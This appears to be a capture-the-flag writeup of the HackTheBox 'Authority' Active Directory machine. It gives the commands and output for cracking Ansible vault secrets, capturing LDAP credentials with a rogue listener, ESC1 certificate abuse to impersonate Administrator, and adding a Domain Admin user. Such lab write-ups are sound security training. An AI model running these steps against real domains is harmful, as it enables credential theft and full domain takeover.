---
title: "HackTheBox - Authority"
author: DrLi
description: "Writeup of a medium-rated Windows Active Directory machine from HackTheBox"
date: 2025-11-12 12:11:20 +0000
categories : [HackTheBox, Machines]
tags: [hackthebox, windows, medium, active directory, smb, ansible, vault, pwm, ldap, adcs, esc1, certificate abuse, winrm, certipy]
img_path: /assets/img/HackTheBox/Machines/Authority
image:
    path: /assets/img/HackTheBox/Machines/Authority/authority.png
---

<div align="center"> <script src="https://tryhackme.com/badge/2794771"></script> </div>

---

[Authority](https://www.hackthebox.com/machines/authority) from [HackTheBox](https://www.hackthebox.com/) is a medium Windows Active Directory machine that starts with anonymous SMB enumeration to discover Ansible playbooks containing encrypted vault variables. After cracking the vault password and decrypting credentials, we access a PWM (Password Self-Service) configuration manager. By configuring PWM to connect to our malicious LDAP server, we capture plaintext LDAP service account credentials. Using these credentials, we enumerate Active Directory Certificate Services and discover a vulnerable certificate template susceptible to ESC1 abuse. We create a machine account, request a certificate as Administrator, and use pass-the-certificate techniques via LDAP to achieve domain compromise.


### Enumeration

## nmap

```bash
┌──(drli㉿kali)-[~/Desktop/HTB-Machines/Authority]
└─$ nmap -T4 --min-rate 1000 -sV -sC -Pn -n -p- 10.129.121.147 -o nmap 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-12 03:56 EST
Warning: 10.129.121.147 giving up on port because retransmission cap hit (6).
Nmap scan report for 10.129.121.147
Host is up (0.058s latency).
Not shown: 63923 closed tcp ports (reset), 1583 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: IIS Windows Server
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-11-12 12:58:31Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: authority.htb, Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: othername: UPN:AUTHORITY$@htb.corp, DNS:authority.htb.corp, DNS:htb.corp, DNS:HTB
| Not valid before: 2022-08-09T23:03:21
|_Not valid after:  2024-08-09T23:13:21
|_ssl-date: 2025-11-12T12:59:31+00:00; +4h00m01s from scanner time.
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: authority.htb, Site: Default-First-Site-Name)
|_ssl-date: 2025-11-12T12:59:30+00:00; +4h00m02s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: othername: UPN:AUTHORITY$@htb.corp, DNS:authority.htb.corp, DNS:htb.corp, DNS:HTB
| Not valid before: 2022-08-09T23:03:21
|_Not valid after:  2024-08-09T23:13:21
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: authority.htb, Site: Default-First-Site-Name)
|_ssl-date: 2025-11-12T12:59:31+00:00; +4h00m01s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: othername: UPN:AUTHORITY$@htb.corp, DNS:authority.htb.corp, DNS:htb.corp, DNS:HTB
| Not valid before: 2022-08-09T23:03:21
|_Not valid after:  2024-08-09T23:13:21
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: authority.htb, Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: othername: UPN:AUTHORITY$@htb.corp, DNS:authority.htb.corp, DNS:htb.corp, DNS:HTB
| Not valid before: 2022-08-09T23:03:21
|_Not valid after:  2024-08-09T23:13:21
|_ssl-date: 2025-11-12T12:59:30+00:00; +4h00m02s from scanner time.
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
8443/tcp  open  ssl/http      Apache Tomcat (language: en)
|_ssl-date: TLS randomness does not represent time
|_http-title: Site doesn't have a title (text/html;charset=ISO-8859-1).
| ssl-cert: Subject: commonName=172.16.2.118
| Not valid before: 2025-11-10T12:55:04
|_Not valid after:  2027-11-13T00:33:28
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49671/tcp open  msrpc         Microsoft Windows RPC
49674/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49675/tcp open  msrpc         Microsoft Windows RPC
49680/tcp open  msrpc         Microsoft Windows RPC
49684/tcp open  msrpc         Microsoft Windows RPC
49697/tcp open  msrpc         Microsoft Windows RPC
49700/tcp open  msrpc         Microsoft Windows RPC
62912/tcp open  msrpc         Microsoft Windows RPC
62925/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: AUTHORITY; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2025-11-12T12:59:24
|_  start_date: N/A
|_clock-skew: mean: 4h00m01s, deviation: 0s, median: 4h00m01s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 150.93 seconds
```

we have Apache tomcat on port 8443 which is weird 

![image.png](/assets/img/HackTheBox/Machines/Authority/image.png)

it’s asking for credentials which we don’t have so we might need to go back to it! 

and port 80 just has default IIS configuration nothing interesting

we can start by checking SMB anonymous and Guest login

```bash
┌──(drli㉿kali)-[~/Desktop/HTB-Machines/Authority]
└─$ sudo nxc smb authority.htb  -u 'a' -p ''         
SMB         10.129.121.147  445    AUTHORITY        [*] Windows 10 / Server 2019 Build 17763 x64 (name:AUTHORITY) (domain:authority.htb) (signing:True) (SMBv1:False)
SMB         10.129.121.147  445    AUTHORITY        [+] authority.htb\a: (Guest)
                                                                                                                    
┌──(drli㉿kali)-[~/Desktop/HTB-Machines/Authority]
└─$ sudo nxc smb authority.htb  -u 'a' -p '' --users
SMB         10.129.121.147  445    AUTHORITY        [*] Windows 10 / Server 2019 Build 17763 x64 (name:AUTHORITY) (domain:authority.htb) (signing:True) (SMBv1:False)
SMB         10.129.121.147  445    AUTHORITY        [+] authority.htb\a: (Guest)
                                                                                                                    
┌──(drli㉿kali)-[~/Desktop/HTB-Machines/Authority]
└─$ sudo nxc smb authority.htb  -u 'a' -p '' --shares
SMB         10.129.121.147  445    AUTHORITY        [*] Windows 10 / Server 2019 Build 17763 x64 (name:AUTHORITY) (domain:authority.htb) (signing:True) (SMBv1:False)
SMB         10.129.121.147  445    AUTHORITY        [+] authority.htb\a: (Guest)
SMB         10.129.121.147  445    AUTHORITY        [*] Enumerated shares
SMB         10.129.121.147  445    AUTHORITY        Share           Permissions     Remark
SMB         10.129.121.147  445    AUTHORITY        -----           -----------     ------
SMB         10.129.121.147  445    AUTHORITY        ADMIN$                          Remote Admin
SMB         10.129.121.147  445    AUTHORITY        C$                              Default share
SMB         10.129.121.147  445    AUTHORITY        Department Shares                 
SMB         10.129.121.147  445    AUTHORITY        Development     READ            
SMB         10.129.121.147  445    AUTHORITY        IPC$            READ            Remote IPC
SMB         10.129.121.147  445    AUTHORITY        NETLOGON                        Logon server share 
SMB         10.129.121.147  445    AUTHORITY        SYSVOL                          Logon server share 
```

we have access to the Development share

let’s see what we can find 

```bash
┌──(drli㉿kali)-[~/Desktop/HTB-Machines/Authority]
└─$ smbclient  -U '' -N //10.129.121.147/Development  
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Fri Mar 17 09:20:38 2023
  ..                                  D        0  Fri Mar 17 09:20:38 2023
  Automation                          D        0  Fri Mar 17 09:20:40 2023

                5888511 blocks of size 4096. 1145745 blocks available
smb: \> cd Automation\
smb: \Automation\> ls
  .                                   D        0  Fri Mar 17 09:20:40 2023
  ..                                  D        0  Fri Mar 17 09:20:40 2023
  Ansible                             D        0  Fri Mar 17 09:20:50 2023

                5888511 blocks of size 4096. 1144955 blocks available
smb: \Automation\> cd Ansible\
smb: \Automation\Ansible\> ls
  .                                   D        0  Fri Mar 17 09:20:50 2023
  ..                                  D        0  Fri Mar 17 09:20:50 2023
  ADCS                                D        0  Fri Mar 17 09:20:48 2023
  LDAP                                D        0  Fri Mar 17 09:20:48 2023
  PWM                                 D        0  Fri Mar 17 09:20:48 2023
  SHARE                               D        0  Fri Mar 17 09:20:48 2023
```

these folders are anasible files 

so they might contain some sensitive data

let’s download all and see what we can find 

```bash
recurse on
prompt off 
mget *
```

in on off the files we can find 

inside PWM/defaults/main.yml

```bash
---
pwm_run_dir: "{{ lookup('env', 'PWD') }}"

pwm_hostname: authority.htb.corp
pwm_http_port: "{{ http_port }}"
pwm_https_port: "{{ https_port }}"
pwm_https_enable: true

pwm_require_ssl: false

pwm_admin_login: !vault |
          $ANSIBLE_VAULT;1.1;AES256
          32666534386435366537653136663731633138616264323230383566333966346662313161326239
          6134353663663462373265633832356663356239383039640a346431373431666433343434366139
          35653634376333666234613466396534343030656165396464323564373334616262613439343033
          6334326263326364380a653034313733326639323433626130343834663538326439636232306531
          3438

pwm_admin_password: !vault |
          $ANSIBLE_VAULT;1.1;AES256
          31356338343963323063373435363261323563393235633365356134616261666433393263373736
          3335616263326464633832376261306131303337653964350a363663623132353136346631396662
          38656432323830393339336231373637303535613636646561653637386634613862316638353530
          3930356637306461350a316466663037303037653761323565343338653934646533663365363035
          6531

ldap_uri: ldap://127.0.0.1/
ldap_base_dn: "DC=authority,DC=htb"
ldap_admin_password: !vault |
          $ANSIBLE_VAULT;1.1;AES256
          63303831303534303266356462373731393561313363313038376166336536666232626461653630
          3437333035366235613437373733316635313530326639330a643034623530623439616136363563
          34646237336164356438383034623462323531316333623135383134656263663266653938333334
          3238343230333633350a646664396565633037333431626163306531336336326665316430613566
          3764
```

we can attempt to crack these using john  

```bash
┌──(drli㉿kali)-[~/…/HTB-Machines/Authority/PWN_files/defaults]
└─$ cat > vault_1.vault << 'EOF'
$ANSIBLE_VAULT;1.1;AES256
326665343864353665376531366637316331386162643232303835663339663466623131613262396134353663663462373265633832356663356239383039640a346431373431666433343434366139356536343763336662346134663965343430306561653964643235643733346162626134393430336334326263326364380a6530343137333266393234336261303438346635383264396362323065313438
EOF
                                                                                                                    
┌──(drli㉿kali)-[~/…/HTB-Machines/Authority/PWN_files/defaults]
└─$ cat > vault_2.vault << 'EOF'
$ANSIBLE_VAULT;1.1;AES256
313563383439633230633734353632613235633932356333653561346162616664333932633737363335616263326464633832376261306131303337653964350a363663623132353136346631396662386564323238303933393362313736373035356136366465616536373866346138623166383535303930356637306461350a3164666630373030376537613235653433386539346465336633653630356531
EOF
                                                                                                                    
┌──(drli㉿kali)-[~/…/HTB-Machines/Authority/PWN_files/defaults]
└─$ cat > vault_3.vault << 'EOF'
$ANSIBLE_VAULT;1.1;AES256
633038313035343032663564623737313935613133633130383761663365366662326264616536303437333035366235613437373733316635313530326639330a643034623530623439616136363563346462373361643564383830346234623235313163336231353831346562636632666539383333343238343230333633350a6466643965656330373334316261633065313363363266653164306135663764
EOF
                                                                                                                    
┌──(drli㉿kali)-[~/…/HTB-Machines/Authority/PWN_files/defaults]
└─$ ansible2john vault_*.vault > vault_hashes.txt
                                                                                                                    
┌──(drli㉿kali)-[~/…/HTB-Machines/Authority/PWN_files/defaults]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt vault_hashes.txt
Using default input encoding: UTF-8
Loaded 3 password hashes with 3 different salts (ansible, Ansible Vault [PBKDF2-SHA256 HMAC-256 256/256 AVX2 8x])
Cost 1 (iteration count) is 10000 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
!@#$%^&*         (vault_2.vault)     
!@#$%^&*         (vault_1.vault)     
!@#$%^&*         (vault_3.vault)     
3g 0:00:01:47 DONE (2025-11-12 05:15) 0.02787g/s 369.8p/s 1109c/s 1109C/s 001983..victor2
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

and now we have the password for all vaults 

we can use anisible_vault and the password we just found to decrypt the vaults

```bash
┌──(drli㉿kali)-[~/…/HTB-Machines/Authority/PWN_files/defaults]
└─$ ansible-vault decrypt vault_1.vault --output pwm_admin_login.txt
Vault password: 
Decryption successful
                                                                                                                    
┌──(drli㉿kali)-[~/…/HTB-Machines/Authority/PWN_files/defaults]
└─$ cat pwm_admin_login.txt     
svc_pwm                                                                                                                    
┌──(drli㉿kali)-[~/…/HTB-Machines/Authority/PWN_files/defaults]
└─$ ansible-vault decrypt vault_2.vault --output pwm_admin_password.txt
Vault password: 
Decryption successful
                                                                                                                    
┌──(drli㉿kali)-[~/…/HTB-Machines/Authority/PWN_files/defaults]
└─$ cat pwm_admin_password.txt 
pWm_@dm!N_!23                                                                                                                    
┌──(drli㉿kali)-[~/…/HTB-Machines/Authority/PWN_files/defaults]
└─$ ansible-vault decrypt vault_3.vault --output ldap_admin_password.txt
Vault password: 
Decryption successful
                                                                                                                    
┌──(drli㉿kali)-[~/…/HTB-Machines/Authority/PWN_files/defaults]
└─$ cat ldap_admin_password.txt 
DevT3st@123                     
```

now that we have credentials we can try them with netexec

```bash
┌──(drli㉿kali)-[~/Desktop/HTB-Machines/Authority/ADCS]
└─$ nxc smb authority.htb  -u 'svc_pwm' -p 'pWm_@dm!N_!23'
SMB         10.129.121.147  445    AUTHORITY        [*] Windows 10 / Server 2019 Build 17763 x64 (name:AUTHORITY) (domain:authority.htb) (signing:True) (SMBv1:False)
SMB         10.129.121.147  445    AUTHORITY        [+] authority.htb\svc_pwm:pWm_@dm!N_!23 (Guest)
                                                                                                                    
┌──(drli㉿kali)-[~/Desktop/HTB-Machines/Authority/ADCS]
└─$ nxc smb authority.htb  -u 'svc_pwm' -p 'pWm_@dm!N_!23' 
SMB         10.129.121.147  445    AUTHORITY        [*] Windows 10 / Server 2019 Build 17763 x64 (name:AUTHORITY) (domain:authority.htb) (signing:True) (SMBv1:False)
SMB         10.129.121.147  445    AUTHORITY        [+] authority.htb\svc_pwm:pWm_@dm!N_!23 (Guest)
```

as we can see it treats it just like a guest account which means the username is not valid for a domain account 

this means we should try and use it in the web portal on port 8443

![image.png](/assets/img/HackTheBox/Machines/Authority/image1.png)

the password worked and we can access the configuration manager 

after downloading the configuration file the only interesting thing is this

```bash
<value>
CN=svc_ldap,OU=Service Accounts,OU=CORP,DC=authority,DC=htb
</value>
```

now we have a valid user 

we just need a password

so after accessing the configuration editor 

we can see that we add and test a LDAP URL

![image.png](/assets/img/HackTheBox/Machines/Authority/image2.png)

so let’s add one that has our IP and see what we get

![image.png](/assets/img/HackTheBox/Machines/Authority/image3.png)

we should start a listener on that port 

when we click test

```bash
┌──(drli㉿kali)-[~/Desktop/HTB-Machines/Authority]
└─$ sudo nc -lvnp 389                    
[sudo] password for drli: 
listening on [any] 389 ...
connect to [10.10.14.100] from (UNKNOWN) [10.129.121.147] 60358
0Y`T;CN=svc_ldap,OU=Service Accounts,OU=CORP,DC=authority,DC=htb�lDaP_1n_th3_cle4r! 
```

this could be the LDAP user password let’s test it

```bash
┌──(drli㉿kali)-[~/Desktop/HTB-Machines/Authority/ADCS]
└─$ nxc winrm authority.htb  -u 'svc_ldap' -p 'lDaP_1n_th3_cle4r!'   
WINRM       10.129.121.147  5985   AUTHORITY        [*] Windows 10 / Server 2019 Build 17763 (name:AUTHORITY) (domain:authority.htb)
WINRM       10.129.121.147  5985   AUTHORITY        [+] authority.htb\svc_ldap:lDaP_1n_th3_cle4r! (Pwn3d!)
```

now we have valide credentials we can try to authenticate to WinRM

```bash
┌──(drli㉿kali)-[~/Desktop/HTB-Machines/Authority/ADCS]
└─$ evil-winrm -i authority.htb -u 'svc_ldap' -p 'lDaP_1n_th3_cle4r!'
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline                                                                                                        
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion                                                                                                                   
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\svc_ldap\Documents> cd ../desktop
*Evil-WinRM* PS C:\Users\svc_ldap\desktop> cat user.txt
49e398dfbffae39fe6a96ff7ac68c180
```

# Privilege Escalation

since we have noticed from the Development share that there is some stuff related to ADCS we can try and enumerate for vulnerable certificates

```bash
┌──(drli㉿kali)-[~/Desktop/HTB-Machines/Authority/ADCS]
└─$ certipy find -vulnerable -u svc_ldap@authority.htb -p 'lDaP_1n_th3_cle4r!' -dc-ip 10.129.121.147 -stdout
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 37 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 13 enabled certificate templates
[*] Finding issuance policies
[*] Found 21 issuance policies
[*] Found 0 OIDs linked to templates
[*] Retrieving CA configuration for 'AUTHORITY-CA' via RRP
[!] Failed to connect to remote registry. Service should be starting now. Trying again...
[*] Successfully retrieved CA configuration for 'AUTHORITY-CA'
[*] Checking web enrollment for CA 'AUTHORITY-CA' @ 'authority.authority.htb'
[!] Error checking web enrollment: [Errno 111] Connection refused
[!] Use -debug to print a stacktrace
[*] Enumeration output:
Certificate Authorities
  0
    CA Name                             : AUTHORITY-CA
    DNS Name                            : authority.authority.htb
    Certificate Subject                 : CN=AUTHORITY-CA, DC=authority, DC=htb
    Certificate Serial Number           : 2C4E1F3CA46BBDAF42A1DDE3EC33A6B4
    Certificate Validity Start          : 2023-04-24 01:46:26+00:00
    Certificate Validity End            : 2123-04-24 01:56:25+00:00
    Web Enrollment
      HTTP
        Enabled                         : False
      HTTPS
        Enabled                         : False
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
    Permissions
      Owner                             : AUTHORITY.HTB\Administrators
      Access Rights
        ManageCa                        : AUTHORITY.HTB\Administrators
                                          AUTHORITY.HTB\Domain Admins
                                          AUTHORITY.HTB\Enterprise Admins
        ManageCertificates              : AUTHORITY.HTB\Administrators
                                          AUTHORITY.HTB\Domain Admins
                                          AUTHORITY.HTB\Enterprise Admins
        Enroll                          : AUTHORITY.HTB\Authenticated Users
Certificate Templates
  0
    Template Name                       : CorpVPN
    Display Name                        : Corp VPN
    Certificate Authorities             : AUTHORITY-CA
    Enabled                             : True
    Client Authentication               : True
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : True
    Certificate Name Flag               : EnrolleeSuppliesSubject
    Enrollment Flag                     : IncludeSymmetricAlgorithms
                                          PublishToDs
                                          AutoEnrollmentCheckUserDsCertificate
    Private Key Flag                    : ExportableKey
    Extended Key Usage                  : Encrypting File System
                                          Secure Email
                                          Client Authentication
                                          Document Signing
                                          IP security IKE intermediate
                                          IP security use
                                          KDC Authentication
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 2
    Validity Period                     : 20 years
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Template Created                    : 2023-03-24T23:48:09+00:00
    Template Last Modified              : 2023-03-24T23:48:11+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : AUTHORITY.HTB\Domain Computers
                                          AUTHORITY.HTB\Domain Admins
                                          AUTHORITY.HTB\Enterprise Admins
      Object Control Permissions
        Owner                           : AUTHORITY.HTB\Administrator
        Full Control Principals         : AUTHORITY.HTB\Domain Admins
                                          AUTHORITY.HTB\Enterprise Admins
        Write Owner Principals          : AUTHORITY.HTB\Domain Admins
                                          AUTHORITY.HTB\Enterprise Admins
        Write Dacl Principals           : AUTHORITY.HTB\Domain Admins
                                          AUTHORITY.HTB\Enterprise Admins
        Write Property Enroll           : AUTHORITY.HTB\Domain Admins
                                          AUTHORITY.HTB\Enterprise Admins
    [+] User Enrollable Principals      : AUTHORITY.HTB\Domain Computers
    [!] Vulnerabilities
      ESC1                              : Enrollee supplies subject and template allows client authentication.
```

we see that there is a vulnerable certificate `CorpVPN` but we cannot enroll in it 

because the only groups able to enroll are

```bash
    Permissions
      Enrollment Permissions
        Enrollment Rights               : AUTHORITY.HTB\Domain Computers
                                          AUTHORITY.HTB\Domain Admins
                                          AUTHORITY.HTB\Enterprise Admins
```

we are not part of any of these 

and even if we enumerate for domain computers we can’t find any

so the idea is to see if we have any machine account quota available and then create a machine account 

```bash
┌──(drli㉿kali)-[~/Desktop/HTB-Machines/Authority/ADCS]
└─$ nxc ldap authority.htb  -u 'svc_ldap' -p 'lDaP_1n_th3_cle4r!' -M maq
LDAP        10.129.121.147  389    AUTHORITY        [*] Windows 10 / Server 2019 Build 17763 (name:AUTHORITY) (domain:authority.htb)
LDAPS       10.129.121.147  636    AUTHORITY        [+] authority.htb\svc_ldap:lDaP_1n_th3_cle4r! 
MAQ         10.129.121.147  389    AUTHORITY        [*] Getting the MachineAccountQuota
MAQ         10.129.121.147  389    AUTHORITY        MachineAccountQuota: 10 
```

YES! we can create machine accounts

```bash
┌──(drli㉿kali)-[~/Desktop/HTB-Machines/Authority]
└─$ impacket-addcomputer -computer-name 'attacker$' -computer-pass 'allopleasekhdm' -dc-host "authority.authority.htb" -domain-netbios "authority.htb" "authority.htb"/"svc_ldap":'lDaP_1n_th3_cle4r!'
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Successfully added machine account attacker$ with password allopleasekhdm.
```

now let’s enroll **Request Certificate as Administrator**

```bash
┌──(drli㉿kali)-[~/Desktop/HTB-Machines/Authority]
└─$ certipy req -u 'attacker$@authority.htb' -p 'allopleasekhdm' -dc-ip 10.129.121.147 -ca AUTHORITY-CA -target 'authority.authority.htb' -template 'CorpVPN' -upn 'administrator@authority.htb'
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Request ID is 3
[*] Successfully requested certificate
[*] Got certificate with UPN 'administrator@authority.htb'
[*] Certificate has no object SID
[*] Try using -sid to set the object SID or see the wiki for more details
[*] Saving certificate and private key to 'administrator.pfx'
[*] Wrote certificate and private key to 'administrator.pfx'

┌──(drli㉿kali)-[~/Desktop/HTB-Machines/Authority]
└─$ sudo ntpdate authority.htb; certipy auth -pfx administrator.pfx -dc-ip 10.129.121.147
[sudo] password for drli: 
2025-11-12 10:23:47.622488 (-0500) +14401.302115 +/- 0.036404 authority.htb 10.129.121.147 s1 no-leap
CLOCK: time stepped by 14401.302115
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN UPN: 'administrator@authority.htb'
[*] Using principal: 'administrator@authority.htb'
[*] Trying to get TGT...
[-] Got error while trying to request TGT: Kerberos SessionError: KDC_ERR_PADATA_TYPE_NOSUPP(KDC has no support for padata type)
[-] Use -debug to print a stacktrace
[-] See the wiki for more information
```

The Domain Controller doesn't support **PKINIT** (certificate-based Kerberos authentication) because it's missing the required certificate with Server Authentication EKU.
so as a solution we can get a LDAP shell using certipy

```bash
┌──(drli㉿kali)-[~/Desktop/HTB-Machines/Authority]
└─$ certipy auth -pfx administrator.pfx -dc-ip 10.129.121.147 -ldap-shell

Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN UPN: 'administrator@authority.htb'
[*] Connecting to 'ldaps://10.129.121.147:636'
[*] Authenticated to '10.129.121.147' as: 'u:HTB\\Administrator'
Type help for list of commands

# whoami
u:HTB\Administrator
 
# add_user pwned 
Attempting to create user in: %s CN=Users,DC=authority,DC=htb
Adding new user with username: pwned and password: !nq8>s[`MJ!vw>w result: OK

# add_user_to_group pwned "Domain Admins"
Adding user: pwned to group Domain Admins result: OK

# exit
Bye!
```

we have created a user and added it to the domain admins group

so have full access to the domain

let’s access using WinRM

```bash
┌──(drli㉿kali)-[~/Desktop/HTB-Machines/Authority]
└─$ nxc ldap authority.htb  -u 'pwned' -p '!nq8>s[`MJ!vw>w'    
LDAP        10.129.121.147  389    AUTHORITY        [*] Windows 10 / Server 2019 Build 17763 (name:AUTHORITY) (domain:authority.htb)
LDAPS       10.129.121.147  636    AUTHORITY        [+] authority.htb\pwned:!nq8>s[`MJ!vw>w (Pwn3d!)
                                                                                                                    
┌──(drli㉿kali)-[~/Desktop/HTB-Machines/Authority]
└─$ evil-winrm -i authority.htb -u 'pwned' -p '!nq8>s[`MJ!vw>w'   
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline                                                                                                        
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion                                                                                                                   
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\pwned\Documents> whoami
htb\pwned
*Evil-WinRM* PS C:\Users\pwned\Documents> cd c:\users\administrator\desktop
*Evil-WinRM* PS C:\users\administrator\desktop> ls

    Directory: C:\users\administrator\desktop

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---       11/12/2025   7:56 AM             34 root.txt

*Evil-WinRM* PS C:\users\administrator\desktop> cat root.txt
0eef5b6724381fc84e159a662e4b7bc9
```

DONE!